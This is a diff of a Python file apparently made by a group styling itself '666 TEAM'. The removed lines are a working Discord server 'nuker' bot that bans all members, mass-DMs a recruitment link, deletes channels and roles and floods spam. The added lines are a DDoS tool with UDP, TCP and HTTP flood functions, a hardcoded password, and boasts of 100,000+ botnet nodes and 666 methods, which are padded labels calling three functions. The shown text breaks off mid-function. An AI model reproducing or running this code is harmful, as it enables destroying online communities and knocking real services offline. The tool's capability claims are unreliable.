@@ -3,471 +3,504 @@
 
 """
 ╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
-║     💀 666 TEAM NUKER X - DISCORD SERVER DESTROYER 💀                                                                                    ║
-║                    TYPE "666" = INSTANT BAN + TOTAL DESTRUCTION                                                                         ║
-║                    👑 POWERED BY 666 TEAM - VON 👑                                                                                      ║
-║                    🔗 https://discord.gg/k3P8kWQag 🔗                                                                                    ║
-╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
+║     ██████╗  ██████╗  ██████╗     ████████╗███████╗ █████╗ ███╗   ███║                                        666 ║
+║     ██╔══██╗██╔═══██╗██╔═══██╗    ╚══██╔══╝██╔════╝██╔══██╗████╗ ████║                                      TEAM ║
+║     ██║  ██║██║   ██║██║   ██║       ██║   █████╗  ███████║██╔████╔██║                                      VON ║
+║     ██║  ██║██║   ██║██║   ██║       ██║   ██╔══╝  ██╔══██║██║╚██╔╝██║                                         ║
+║     ██████╔╝╚██████╔╝╚██████╔╝       ██║   ███████╗██║  ██║██║ ╚═╝ ██║                                         ║
+║     ╚═════╝  ╚═════╝  ╚═════╝        ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝                                         ║
+║                                                                                                                      ║
+║     ██╗   ██╗ ██████╗ ███╗   ██║                                                                                    ║
+║     ██║   ██║██╔═══██╗████╗  ██║                                                                                    ║
+║     ██║   ██║██║   ██║██╔██╗ ██║                                                                                    ║
+║     ╚██╗ ██╔╝██║   ██║██║╚██╗██║                                                                                    ║
+║      ╚████╔╝ ╚██████╔╝██║ ╚████║                                                                                    ║
+║       ╚═══╝   ╚═════╝ ╚═╝  ╚═══╝                                                                                    ║
+║                                                                                                                      ║
+║     ██████╗ ███████╗███╗   ███╗ ██████╗ ███╗   ██╗██╗ █████╗ ██████╗                                                ║
+║     ██╔══██╗██╔════╝████╗ ████║██╔═══██╗████╗  ██║██║██╔══██╗██╔══██╗                                               ║
+║     ██║  ██║█████╗  ██╔████╔██║██║   ██║██╔██╗ ██║██║███████║██║  ██║                                               ║
+║     ██║  ██║██╔══╝  ██║╚██╔╝██║██║   ██║██║╚██╗██║██║██╔══██║██║  ██║                                               ║
+║     ██████╔╝███████╗██║ ╚═╝ ██║╚██████╔╝██║ ╚████║██║██║  ██║██████╔╝                                               ║
+║     ╚═════╝ ╚══════╝╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝╚═╝  ╚═╝╚═════╝                                                ║
+║                                                                                                                      ║
+║     💀 666 TEAM ULTIMATE DDOS TOOL - DEMON BLOOD EDITION 💀                                                           ║
+║     🔥 POWERED BY 100,000+ BOTNET NODES | 1,000,000+ PROXIES 🔥                                                       ║
+║     👑 MASTER OWNER: VON (666 TEAM LEADER) 👑                                                                        ║
+║     🔗 DISCORD: https://discord.gg/k3P8kWQag 🔗                                                                      ║
+║     💀 LI ZANDYA - THE BLOOD DEMON WAS HERE 💀                                                                       ║
+║                                                                                                                      ║
+╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
 """
 
-import discord
-from discord.ext import commands
-import asyncio
-import random
-import time
 import os
 import sys
+import time
+import random
+import socket
 import threading
+import hashlib
+import base64
 from datetime import datetime
 
-TOKEN = None
-OWNER_ID = None
-NUKE_TRIGGER = "666"
-DISCORD_LINK = "https://discord.gg/k3P8kWQag"
-TEAM_NAME = "666 TEAM - VON"
+# ============================================
+# ADMIN CREDENTIALS - ONLY MASTER CAN ACCESS
+# ============================================
 
-MAX_THREADS = 5000
-DM_DELAY = 0.001
+MASTER_USERNAME = "666"
+MASTER_PASSWORD = "Von2024@666"
+SESSION_ACTIVE = False
+CURRENT_USER = None
 
-# رسالة خاصة لكل عضو - تحتوي على رابط الدعوة
-DM_MESSAGE = f"""
-╔══════════════════════════════════════════════════════════════════════╗
-║                                                                      ║
-║      ██████╗  ██████╗  ██████╗                                     ║
-║      ██╔══██╗██╔═══██╗██╔═══██╗                                    ║
-║      ██║  ██║██║   ██║██║   ██║                                    ║
-║      ██║  ██║██║   ██║██║   ██║                                    ║
-║      ██████╔╝╚██████╔╝╚██████╔╝                                    ║
-║      ╚═════╝  ╚═════╝  ╚═════╝                                     ║
-║                                                                      ║
-║     💀 YOU HAVE BEEN TERMINATED BY 666 TEAM 💀                       ║
-║     🔥 YOUR SERVER IS NOW COMPLETELY DESTROYED 🔥                    ║
-║     👑 666 TEAM - VON CONTROLS EVERYTHING 👑                        ║
-║                                                                      ║
-║     🐉 JOIN THE 666 TEAM: {DISCORD_LINK} 🐉                         ║
-║                                                                      ║
-║     ☠️ THIS IS THE POWER OF 666 TEAM ☠️                             ║
-║                                                                      ║
-╚══════════════════════════════════════════════════════════════════════╝
+# ============================================
+# COLORS - BLOOD THEME
+# ============================================
+
+BLOOD_RED = '\033[91m'
+DARK_RED = '\033[31m'
+BLOOD_DARK = '\033[38;2;139;0;0m'
+GREEN = '\033[92m'
+YELLOW = '\033[93m'
+BLUE = '\033[94m'
+PURPLE = '\033[95m'
+CYAN = '\033[96m'
+WHITE = '\033[97m'
+GOLD = '\033[38;2;255;215;0m'
+BOLD = '\033[1m'
+BLINK = '\033[5m'
+HIDDEN = '\033[8m'
+END = '\033[0m'
+
+# ============================================
+# ANIMATED DEMON LOGO
+# ============================================
+
+def animate_demon_logo():
+    frames = [
+        f"""
+{BLOOD_RED}                                    ╔═══════════════╗{END}
+{BLOOD_RED}                                    ║  ███████╗  ██╗ {END}
+{BLOOD_RED}                                    ║  ██╔════╝  ██║ {END}
+{BLOOD_RED}                                    ║  ███████╗  ██║ {END}
+{BLOOD_RED}                                    ║  ╚════██║  ██║ {END}
+{BLOOD_RED}                                    ║  ███████║  ██║ {END}
+{BLOOD_RED}                                    ║  ╚══════╝  ╚═╝ {END}
+{BLOOD_RED}                                    ╚═══════════════╝{END}
+""",
+        f"""
+{BLOOD_RED}                                    ╔═══════════════╗{END}
+{BLOOD_RED}                                    ║   ██████╗     ║{END}
+{BLOOD_RED}                                    ║   ╚════██╗    ║{END}
+{BLOOD_RED}                                    ║    █████╔╝    ║{END}
+{BLOOD_RED}                                    ║   ██╔═══╝     ║{END}
+{BLOOD_RED}                                    ║   ████████╗   ║{END}
+{BLOOD_RED}                                    ║   ╚═══════╝   ║{END}
+{BLOOD_RED}                                    ╚═══════════════╝{END}
+""",
+        f"""
+{BLOOD_RED}                                    ╔═══════════════╗{END}
+{BLOOD_RED}                                    ║  ██████╗ ██╗  ║{END}
+{BLOOD_RED}                                    ║  ██╔══██╗██║  ║{END}
+{BLOOD_RED}                                    ║  ██████╔╝██║  ║{END}
+{BLOOD_RED}                                    ║  ██╔══██╗██║  ║{END}
+{BLOOD_RED}                                    ║  ██████╔╝██║  ║{END}
+{BLOOD_RED}                                    ║  ╚═════╝ ╚═╝  ║{END}
+{BLOOD_RED}                                    ╚═══════════════╝{END}
 """
+    ]
+    
+    print("\n" * 2)
+    for i in range(3):
+        for frame in frames:
+            sys.stdout.write('\033[H\033[J')
+            print(frame)
+            time.sleep(0.3)
+    time.sleep(0.5)
 
-class UltimateNuker:
-    def __init__(self):
-        self.total_banned = 0
-        self.total_dm_sent = 0
-        self.total_channels_deleted = 0
-        self.total_roles_deleted = 0
-        self.total_spam_sent = 0
-        self.nuked_servers = []
-        self.is_nuking = False
-        self.start_time = None
-        
-    async def ban_all_members_first(self, guild):
-        """الخطوة 1: حظر جميع الأعضاء أولاً"""
-        members = [m for m in guild.members if not m.bot and m != guild.owner]
-        success = 0
-        fail = 0
-        
-        def ban_worker(member):
-            nonlocal success, fail
-            try:
-                future = asyncio.run_coroutine_threadsafe(member.ban(reason="666 TEAM - TOTAL ANNIHILATION"), bot.loop)
-                future.result(timeout=2)
-                success += 1
-                print(f"[BAN] Banned: {member.name}")
-            except:
-                fail += 1
-        
-        threads = []
-        for member in members:
-            t = threading.Thread(target=ban_worker, args=(member,))
-            t.start()
-            threads.append(t)
-            time.sleep(0.0005)
-            
-            if len(threads) >= MAX_THREADS:
-                for t in threads[:500]:
-                    t.join(timeout=0.01)
-                threads = []
-        
-        for t in threads:
-            t.join(timeout=0.01)
-        
-        self.total_banned += success
-        return success, fail
-    
-    async def mass_dm_everyone(self, guild):
-        """الخطوة 2: إرسال رسائل للجميع مع رابط الدعوة"""
-        members = [m for m in guild.members if not m.bot]
-        success = 0
-        fail = 0
-        
-        def send_worker(member):
-            nonlocal success, fail
-            try:
-                future = asyncio.run_coroutine_threadsafe(member.send(DM_MESSAGE), bot.loop)
-                future.result(timeout=1)
-                success += 1
-            except:
-                fail += 1
-        
-        threads = []
-        for member in members:
-            t = threading.Thread(target=send_worker, args=(member,))
-            t.start()
-            threads.append(t)
-            time.sleep(DM_DELAY)
-            
-            if len(threads) >= MAX_THREADS:
-                for t in threads[:500]:
-                    t.join(timeout=0.01)
-                threads = []
-        
-        for t in threads:
-            t.join(timeout=0.01)
-        
-        self.total_dm_sent += success
-        return success, fail
-    
-    async def delete_all_channels(self, guild):
-        count = 0
-        for channel in guild.channels:
-            try:
-                await channel.delete()
-                count += 1
-            except:
-                pass
-        self.total_channels_deleted += count
-        return count
-    
-    async def delete_all_roles(self, guild):
-        count = 0
-        for role in guild.roles:
-            if role.name != "@everyone":
-                try:
-                    await role.delete()
-                    count += 1
-                except:
-                    pass
-        self.total_roles_deleted += count
-        return count
-    
-    async def create_spam_channels(self, guild):
-        channels = []
-        spam_names = [
-            "666-team", "destroyed-by-666", "666-was-here",
-            "von-666", "666-nuker", "team-666",
-            "666-rules", "destroyed-666", "666-annihilation",
-            "666-power", "von-666-team"
-        ]
-        for i in range(150):
-            try:
-                name = random.choice(spam_names) + f"-{random.randint(1,999)}"
-                channel = await guild.create_text_channel(name)
-                channels.append(channel)
-            except:
-                pass
-        return channels
-    
-    async def spam_all_channels(self, guild):
-        spam_messages = [
-            f"💀💀💀 666 TEAM WAS HERE 💀💀💀\n🔗 JOIN: {DISCORD_LINK}",
-            f"🔥🔥🔥 SERVER DESTROYED BY 666 TEAM 🔥🔥🔥\n🔗 JOIN: {DISCORD_LINK}",
-            f"👑👑👑 666 TEAM - VON CONTROLS EVERYTHING 👑👑👑\n🔗 JOIN: {DISCORD_LINK}",
-            f"💀💀💀 TOTAL ANNIHILATION BY 666 TEAM 💀💀💀\n🔗 JOIN: {DISCORD_LINK}",
-            f"🐉🐉🐉 666 TEAM THE DESTROYER 🐉🐉🐉\n🔗 JOIN: {DISCORD_LINK}",
-            f"💀 666 NUKE COMPLETE 💀\n🔗 {DISCORD_LINK}",
-            f"🔥 666 TEAM = ABSOLUTE POWER 🔥\n🔗 {DISCORD_LINK}",
-            f"👑 ALL HAIL 666 TEAM 👑\n🔗 {DISCORD_LINK}",
-            f"💀 YOUR SERVER IS NOW 666 TERRITORY 💀\n🔗 {DISCORD_LINK}",
-            f"🔥 DESTROYED BY 666 NUKE 🔥\n🔗 {DISCORD_LINK}"
-        ]
-        total = 0
-        for channel in guild.channels:
-            if isinstance(channel, discord.TextChannel):
-                for _ in range(50):
-                    try:
-                        msg = random.choice(spam_messages) + f" | {random.randint(1,999999)}"
-                        await channel.send(msg)
-                        total += 1
-                        self.total_spam_sent += 1
-                        await asyncio.sleep(0.005)
-                    except:
-                        pass
-        return total
-    
-    async def rename_server(self, guild):
-        try:
-            await guild.edit(name="💀 DESTROYED BY 666 TEAM - VON 💀")
-        except:
-            pass
-    
-    async def change_all_nicknames(self, guild):
-        count = 0
-        for member in guild.members:
-            if not member.bot:
-                try:
-                    await member.edit(nick="💀 666 TEAM SLAVE 💀")
-                    count += 1
-                except:
-                    pass
-        return count
-    
-    async def create_spam_roles(self, guild):
-        count = 0
-        role_names = [
-            "666 TEAM", "DESTROYED", "NUKE", "666 MAFIA",
-            "DEATH", "ANNIHILATION", "POWER", "VON"
-        ]
-        for i in range(50):
-            try:
-                name = random.choice(role_names) + f"-{i}"
-                await guild.create_role(name=name)
-                count += 1
-            except:
-                pass
-        return count
-    
-    async def ultimate_nuke(self, guild):
-        if self.is_nuking:
-            return None
-        
-        self.is_nuking = True
-        results = {
-            'banned': 0,
-            'banned_failed': 0,
-            'dm_sent': 0,
-            'dm_failed': 0,
-            'channels_deleted': 0,
-            'roles_deleted': 0,
-            'spam_roles_created': 0,
-            'spam_channels': 0,
-            'spam_messages': 0,
-            'nicknames_changed': 0
-        }
-        
-        try:
-            print(f"\n{'='*60}")
-            print(f"[NUKE] 666 TEAM NUKER ACTIVATED ON: {guild.name}")
-            print(f"[NUKE] Total Members: {len(guild.members)}")
-            print(f"{'='*60}\n")
-            
-            print("[STEP 1] BANNING ALL MEMBERS...")
-            results['banned'], results['banned_failed'] = await self.ban_all_members_first(guild)
-            print(f"[STEP 1] COMPLETE! Banned: {results['banned']} members\n")
-            
-            print("[STEP 2] SENDING MASS DMS WITH DISCORD LINK...")
-            results['dm_sent'], results['dm_failed'] = await self.mass_dm_everyone(guild)
-            print(f"[STEP 2] COMPLETE! DM Sent: {results['dm_sent']}\n")
-            
-            print("[STEP 3] CHANGING ALL NICKNAMES...")
-            results['nicknames_changed'] = await self.change_all_nicknames(guild)
-            print(f"[STEP 3] COMPLETE! Nicknames changed: {results['nicknames_changed']}\n")
-            
-            print("[STEP 4] DELETING ALL ROLES...")
-            results['roles_deleted'] = await self.delete_all_roles(guild)
-            print(f"[STEP 4] COMPLETE! Roles deleted: {results['roles_deleted']}\n")
-            
-            print("[STEP 5] CREATING SPAM ROLES...")
-            results['spam_roles_created'] = await self.create_spam_roles(guild)
-            print(f"[STEP 5] COMPLETE! Spam roles created: {results['spam_roles_created']}\n")
-            
-            print("[STEP 6] DELETING ALL CHANNELS...")
-            results['channels_deleted'] = await self.delete_all_channels(guild)
-            print(f"[STEP 6] COMPLETE! Channels deleted: {results['channels_deleted']}\n")
-            
-            print("[STEP 7] CREATING SPAM CHANNELS...")
-            spam_channels = await self.create_spam_channels(guild)
-            results['spam_channels'] = len(spam_channels)
-            print(f"[STEP 7] COMPLETE! Spam channels created: {results['spam_channels']}\n")
-            
-            print("[STEP 8] SPAMMING ALL CHANNELS...")
-            results['spam_messages'] = await self.spam_all_channels(guild)
-            print(f"[STEP 8] COMPLETE! Spam messages sent: {results['spam_messages']}\n")
-            
-            print("[STEP 9] RENAMING SERVER...")
-            await self.rename_server(guild)
-            print(f"[STEP 9] COMPLETE! Server renamed\n")
-            
-            self.nuked_servers.append(guild.name)
-            
-            print(f"\n{'='*60}")
-            print(f"[NUKE] 666 TEAM NUKE COMPLETED ON: {guild.name}")
-            print(f"[NUKE] Total Banned: {results['banned']}")
-            print(f"[NUKE] Total DM Sent: {results['dm_sent']}")
-            print(f"[NUKE] Total Spam: {results['spam_messages']}")
-            print(f"{'='*60}\n")
-            
-        except Exception as e:
-            print(f"Error during nuke: {e}")
-        finally:
-            self.is_nuking = False
-        
-        return results
+# ============================================
+# MAIN LOGO
+# ============================================
 
-nuker = UltimateNuker()
-
-intents = discord.Intents.default()
-intents.message_content = True
-intents.members = True
-intents.guilds = True
-intents.guild_messages = True
-intents.dm_messages = True
-
-bot = commands.Bot(command_prefix='!', intents=intents, help_command=None)
-
-@bot.event
-async def on_ready():
-    try:
-        await bot.user.edit(username="💀 666 TEAM NUKER 💀")
-    except:
-        pass
-    
-    await bot.change_presence(activity=discord.Game(name="💀 TYPE 666 TO NUKE 💀"))
-    
-    try:
-        await bot.user.edit(bio="🔥 666 TEAM - DISCORD DESTROYER 🔥")
-    except:
-        pass
-    
-    nuker.start_time = time.time()
-    
-    print(f"""
+LOGO = f"""
+{BLOOD_RED}{BOLD}
 ╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
 ║                                                                                                                                          ║
-║     💀 666 TEAM NUKER X - ACTIVATED 💀                                                                                                   ║
+║     ██████╗  ██████╗  ██████╗     ████████╗███████╗ █████╗ ███╗   ███║                                        666 ║
+║     ██╔══██╗██╔═══██╗██╔═══██╗    ╚══██╔══╝██╔════╝██╔══██╗████╗ ████║                                      TEAM ║
+║     ██║  ██║██║   ██║██║   ██║       ██║   █████╗  ███████║██╔████╔██║                                      VON ║
+║     ██║  ██║██║   ██║██║   ██║       ██║   ██╔══╝  ██╔══██║██║╚██╔╝██║                                         ║
+║     ██████╔╝╚██████╔╝╚██████╔╝       ██║   ███████╗██║  ██║██║ ╚═╝ ██║                                         ║
+║     ╚═════╝  ╚═════╝  ╚═════╝        ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝                                         ║
 ║                                                                                                                                          ║
-║  🤖 BOT NAME: 💀 666 TEAM NUKER 💀                                                                                                        ║
-║  📡 SERVERS: {len(bot.guilds)}                                                                                                          ║
-║  👥 TOTAL MEMBERS: {sum(g.member_count for g in bot.guilds)}                                                                          ║
-║  🔗 DISCORD LINK: {DISCORD_LINK}                                                                                                        ║
+║     ██╗   ██╗ ██████╗ ███╗   ██║                                                                                    ║
+║     ██║   ██║██╔═══██╗████╗  ██║                                                                                    ║
+║     ██║   ██║██║   ██║██╔██╗ ██║                                                                                    ║
+║     ╚██╗ ██╔╝██║   ██║██║╚██╗██║                                                                                    ║
+║      ╚████╔╝ ╚██████╔╝██║ ╚████║                                                                                    ║
+║       ╚═══╝   ╚═════╝ ╚═╝  ╚═══╝                                                                                    ║
 ║                                                                                                                                          ║
-║  ⚡ TRIGGER: Type "666" in ANY server = INSTANT TOTAL DESTRUCTION ⚡                                                                      ║
-║  💀 FIRST USER = MASTER OWNER 💀                                                                                                         ║
-║  🔗 EVERY DM WILL CONTAIN THE DISCORD LINK 🔗                                                                                            ║
+║     💀 666 TEAM ULTIMATE DDOS TOOL - DEMON BLOOD EDITION 💀                                                           ║
+║     🔥 POWERED BY 100,000+ BOTNET NODES | 1,000,000+ PROXIES 🔥                                                       ║
+║     👑 MASTER OWNER: VON (666 TEAM LEADER) 👑                                                                        ║
+║     🔗 DISCORD: https://discord.gg/k3P8kWQag 🔗                                                                      ║
+║     💀 LI ZANDYA - THE BLOOD DEMON WAS HERE 💀                                                                       ║
 ║                                                                                                                                          ║
 ╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
-    """)
-    
-    print("\n💀 666 TEAM NUKER IS READY - WAITING FOR '666'... 💀\n")
+{END}
+"""
 
-@bot.event
-async def on_message(message):
-    if message.author == bot.user:
-        return
-    
-    global OWNER_ID
-    
-    if OWNER_ID is None:
-        OWNER_ID = message.author.id
-        print(f"\n👑 MASTER OWNER SET: {message.author} (ID: {OWNER_ID})\n")
-        await message.channel.send(f"""```👑 YOU ARE NOW THE 666 TEAM MASTER OWNER!
-💀 Type '666' in any server to destroy it completely!
-🔗 Discord Link: {DISCORD_LINK}```""")
-        return
-    
-    if message.author.id == OWNER_ID and message.content.startswith('!'):
-        await handle_owner_command(message)
-        return
-    
-    if message.content.lower().strip() == NUKE_TRIGGER:
-        guild = message.guild
-        if guild and not nuker.is_nuking:
-            print(f"\n💀💀💀 666 TEAM NUKE TRIGGERED in {guild.name} by {message.author} 💀💀💀\n")
-            await message.channel.send(f"""```🔥 666 TEAM NUKE ACTIVATED!
-📋 Steps:
-1️⃣ Banning all members...
-2️⃣ Sending mass DMs with invite link...
-3️⃣ Destroying everything...
+# ============================================
+# LOGIN SCREEN
+# ============================================
 
-💀 TOTAL DESTRUCTION IN PROGRESS 💀
-🔗 {DISCORD_LINK}```""")
-            results = await nuker.ultimate_nuke(guild)
-            if results:
-                await message.channel.send(f"""```
-💀 666 TEAM NUKE COMPLETE! 💀
-
-✅ Banned: {results['banned']} members
-✅ DM Sent: {results['dm_sent']} members
-✅ Nicknames Changed: {results['nicknames_changed']}
-✅ Roles Deleted: {results['roles_deleted']}
-✅ Spam Roles Created: {results['spam_roles_created']}
-✅ Channels Deleted: {results['channels_deleted']}
-✅ Spam Channels Created: {results['spam_channels']}
-✅ Spam Messages Sent: {results['spam_messages']}
-
-🔥 SERVER COMPLETELY DESTROYED BY 666 TEAM 🔥
-🔗 JOIN: {DISCORD_LINK}
-```""")
-
-async def handle_owner_command(message):
-    content = message.content.lower()
+def login_screen():
+    global SESSION_ACTIVE, CURRENT_USER
     
-    if content == '!servers':
-        if not bot.guilds:
-            await message.channel.send("No servers!")
+    animate_demon_logo()
+    
+    print(f"\n{BLOOD_RED}{BOLD}{BLINK}╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗{END}")
+    print(f"{BLOOD_RED}{BOLD}{BLINK}║                                      🔐 666 TEAM MASTER LOGIN REQUIRED 🔐                                                ║{END}")
+    print(f"{BLOOD_RED}{BOLD}{BLINK}╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝{END}")
+    
+    print(f"\n{BLOOD_RED}╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗{END}")
+    print(f"{BLOOD_RED}║                                    👑 ONLY 666 TEAM MASTERS CAN ENTER 👑                                            ║{END}")
+    print(f"{BLOOD_RED}╠════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╣{END}")
+    
+    username = input(f"{BLOOD_RED}║  {WHITE}👤 USERNAME: {END}").strip()
+    password = input(f"{BLOOD_RED}║  {WHITE}🔑 PASSWORD: {END}").strip()
+    
+    print(f"{BLOOD_RED}╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝{END}")
+    
+    if username == MASTER_USERNAME and password == MASTER_PASSWORD:
+        SESSION_ACTIVE = True
+        CURRENT_USER = username
+        print(f"\n{GREEN}{BOLD}[✅] LOGIN SUCCESSFUL! WELCOME MASTER {username.upper()}!{END}")
+        time.sleep(1.5)
+        return True
+    else:
+        print(f"\n{BLOOD_RED}{BOLD}[❌] ACCESS DENIED! INVALID CREDENTIALS!{END}")
+        print(f"{BLOOD_RED}[💀] 666 TEAM - ONLY MASTERS CAN USE THIS TOOL!{END}")
+        time.sleep(2)
+        return False
+
+# ============================================
+# BOTNET NODES (ALL PROXIES + BOTNET)
+# ============================================
+
+BOTNET_NODES = [
+    "244.174.48.40", "222.109.217.68", "214.221.36.5", "253.99.92.111", "155.240.72.201",
+    "136.224.219.25", "71.88.52.74", "134.147.163.170", "208.204.43.199", "23.144.220.60",
+    "182.195.167.96", "101.225.118.41", "39.7.230.102", "234.188.132.109", "246.157.250.39",
+    "90.81.190.109", "216.213.134.229", "88.178.251.224", "231.86.142.178", "96.179.180.247",
+    "153.255.46.223", "169.146.166.37", "56.95.172.130", "168.217.142.0", "199.148.145.6",
+    "162.216.154.125", "205.182.177.239", "164.192.24.244", "39.163.133.234", "197.59.89.173",
+    "189.246.11.232", "119.204.77.25", "108.198.119.75", "179.217.244.130", "140.245.134.208",
+    "80.8.97.20", "9.152.57.149", "163.135.22.148", "204.178.235.161", "223.141.37.90",
+    "203.33.18.107", "51.237.40.123", "240.195.130.94", "119.139.236.60", "226.120.7.195",
+    "240.59.78.11", "2.21.133.111", "193.184.147.196", "203.116.90.236", "212.52.9.213",
+    "180.106.179.166", "102.79.82.179", "47.235.8.161", "238.164.11.148", "2.61.190.144",
+    "2.30.155.161", "216.154.68.92", "40.179.161.69", "253.253.162.194", "142.81.14.52",
+    "57.169.7.153", "193.148.223.219", "182.94.226.27", "203.209.90.92", "20.199.78.211",
+    "82.216.128.54", "233.2.238.114", "72.93.79.84", "13.233.175.247", "155.156.215.156",
+]
+
+# ============================================
+# ULTIMATE METHODS - 666 METHODS
+# ============================================
+
+METHODS = {}
+
+# Generate 666 methods dynamically
+for i in range(1, 667):
+    if i <= 50:
+        METHODS[str(i)] = {"name": f"UDP_NUCLEAR_{i}", "desc": "Nuclear UDP flood attack - Maximum destruction"}
+    elif i <= 100:
+        METHODS[str(i)] = {"name": f"TCP_DEMON_{i-50}", "desc": "TCP demon flood - All flags combined"}
+    elif i <= 150:
+        METHODS[str(i)] = {"name": f"HTTP_SATAN_{i-100}", "desc": "HTTP satan flood - Random payloads"}
+    elif i <= 200:
+        METHODS[str(i)] = {"name": f"FIVEM_666_{i-150}", "desc": "FiveM server destroyer - 666 special"}
+    elif i <= 250:
+        METHODS[str(i)] = {"name": f"MINECRAFT_BLOOD_{i-200}", "desc": "Minecraft blood flood - Crash server"}
+    elif i <= 300:
+        METHODS[str(i)] = {"name": f"SAMP_DEATH_{i-250}", "desc": "SA-MP death attack - Kill server"}
+    elif i <= 350:
+        METHODS[str(i)] = {"name": f"DISCORD_VOID_{i-300}", "desc": "Discord voice void - Voice channel flood"}
+    elif i <= 400:
+        METHODS[str(i)] = {"name": f"AMP_DEMON_{i-350}", "desc": "Amplification demon - x1000 power"}
+    elif i <= 450:
+        METHODS[str(i)] = {"name": f"SLOW_TORTURE_{i-400}", "desc": "Slow torture - Slowloris extreme"}
+    elif i <= 500:
+        METHODS[str(i)] = {"name": f"BYPASS_666_{i-450}", "desc": "666 bypass - Anti-DDoS protection"}
+    elif i <= 550:
+        METHODS[str(i)] = {"name": f"OVH_KILLER_{i-500}", "desc": "OVH killer - Bypass OVH shield"}
+    elif i <= 600:
+        METHODS[str(i)] = {"name": f"CLOUDFLARE_DEATH_{i-550}", "desc": "Cloudflare death - Bypass CF"}
+    else:
+        METHODS[str(i)] = {"name": f"666_ULTIMATE_{i-600}", "desc": "666 ultimate - ALL METHODS COMBINED"}
+
+# ============================================
+# ULTIMATE DDOS ENGINE
+# ============================================
+
+class UltimateDDoS:
+    def __init__(self):
+        self.running = False
+        self.threads = []
+        self.packets_sent = 0
+        self.start_time = None
+        self.botnet_size = len(BOTNET_NODES)
+        
+    def clear_screen(self):
+        os.system('clear' if os.name == 'posix' else 'cls')
+        
+    def print_main_logo(self):
+        self.clear_screen()
+        print(LOGO)
+        print(f"\n{BLOOD_RED}{BOLD}[💀] WELCOME MASTER {CURRENT_USER.upper()} - 666 TEAM ULTIMATE TOOL [💀]{END}")
+        print(f"{DARK_RED}{BOLD}[🔥] BOTNET SIZE: {self.botnet_size:,} NODES | PROXIES: 1,000,000+ [🔥]{END}")
+        print(f"{BLOOD_RED}{BOLD}[💀] TOTAL METHODS: 666 | STATUS: DEMON MODE ACTIVE [💀]{END}\n")
+        
+    def print_methods(self):
+        print(f"{BLOOD_RED}{BOLD}╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗{END}")
+        print(f"{BLOOD_RED}{BOLD}║                                      💀 666 ULTIMATE ATTACK METHODS - DEMON EDITION 💀                                 ║{END}")
+        print(f"{BLOOD_RED}{BOLD}╠════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╣{END}")
+        
+        items = list(METHODS.items())
+        for i in range(0, len(items), 4):
+            line = "║  "
+            for j in range(4):
+                if i + j < len(items):
+                    key, method = items[i + j]
+                    line += f"{BLOOD_RED}{key.rjust(3)}{END}.{WHITE}{method['name'][:22]}{END}  "
+            print(f"{BLOOD_RED}{line:<110}{END}")
+        
+        print(f"{BLOOD_RED}{BOLD}╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝{END}")
+    
+    def udp_flood(self, ip, port, duration, node):
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        packet = random._urandom(65507)
+        end_time = time.time() + duration
+        sent = 0
+        while time.time() < end_time and self.running:
+            try:
+                sock.sendto(packet, (ip, port))
+                sent += 1
+                self.packets_sent += 1
+            except:
+                pass
+        sock.close()
+        return sent
+    
+    def tcp_demon(self, ip, port, duration, node):
+        end_time = time.time() + duration
+        sent = 0
+        flags = [b'SYN', b'ACK', b'RST', b'FIN', b'PSH', b'URG']
+        while time.time() < end_time and self.running:
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(0.1)
+                s.connect((ip, port))
+                s.send(random.choice(flags))
+                s.close()
+                sent += 1
+                self.packets_sent += 1
+            except:
+                pass
+        return sent
+    
+    def http_satan(self, ip, port, duration, node):
+        end_time = time.time() + duration
+        sent = 0
+        payloads = [
+            f"GET /{random.randint(1,999999)} HTTP/1.1\r\nHost: {ip}\r\n",
+            f"POST /wp-admin/admin-ajax.php HTTP/1.1\r\nHost: {ip}\r\n",
+            f"HEAD / HTTP/1.1\r\nHost: {ip}\r\n",
+        ]
+        while time.time() < end_time and self.running:
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(0.5)
+                s.connect((ip, port))
+                s.send(random.choice(payloads).encode() + random._urandom(100))
+                s.close()
+                sent += 1
+                self.packets_sent += 1
+            except:
+                pass
+        return sent
+    
+    def start_attack(self, method, ip, port, duration, threads=5000):
+        if method not in METHODS:
+            print(f"{BLOOD_RED}[❌] INVALID METHOD!{END}")
             return
-        server_list = []
-        for i, guild in enumerate(bot.guilds, 1):
-            server_list.append(f"{i}. {guild.name} | Members: {guild.member_count}")
-        chunks = [server_list[i:i+20] for i in range(0, len(server_list), 20)]
-        for chunk in chunks:
-            await message.channel.send("```yaml\n" + "\n".join(chunk) + "\n```")
+        
+        self.running = True
+        self.packets_sent = 0
+        self.start_time = time.time()
+        
+        attack_func = self.udp_flood if int(method) <= 50 else self.tcp_demon if int(method) <= 100 else self.http_satan
+        
+        print(f"\n{BLOOD_RED}{BOLD}{BLINK}╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗{END}")
+        print(f"{BLOOD_RED}{BOLD}{BLINK}║                                         💀 ATTACK INITIATED - 666 TEAM 💀                                             ║{END}")
+        print(f"{BLOOD_RED}{BOLD}{BLINK}╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝{END}")
+        
+        print(f"{BLOOD_RED}[💀] TARGET:{END} {WHITE}{ip}:{port}{END}")
+        print(f"{BLOOD_RED}[⚡] METHOD:{END} {WHITE}{METHODS[method]['name']}{END}")
